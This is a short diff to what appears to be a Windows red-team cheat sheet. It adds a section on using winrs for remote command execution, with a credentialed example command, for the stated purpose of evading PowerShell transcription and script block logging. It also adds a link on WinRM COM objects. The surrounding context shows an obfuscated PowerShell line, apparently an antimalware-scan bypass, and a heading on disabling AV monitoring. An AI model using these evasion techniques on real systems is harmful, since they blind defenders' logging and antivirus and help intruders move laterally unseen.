@@ -31,6 +31,15 @@ Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + (
 RunWithRegistryNonAdmin.bat
 ```
 
+## Winrs
+- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
+```
+winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
+```
+
+## Com objects
+- https://github.com/bohops/WSMan-WinRM
+
 ## General
 #### Disable AV monitoring
 ```
